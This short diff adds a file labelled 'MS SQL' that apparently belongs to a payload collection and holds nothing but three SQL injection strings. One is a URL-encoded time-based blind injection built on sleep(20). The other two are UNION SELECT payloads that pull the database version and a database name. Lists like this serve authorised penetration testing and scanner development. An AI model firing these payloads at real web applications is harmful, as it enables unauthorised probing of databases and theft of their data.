@@ -1,0 +1,8 @@
+MS SQL
+
+
+%27%2b(select*from(select(sleep(20)))a)%2b%27
+
+
+'UNION SELECT @@version--
+'UNION SELECT DB_NAME(8)--
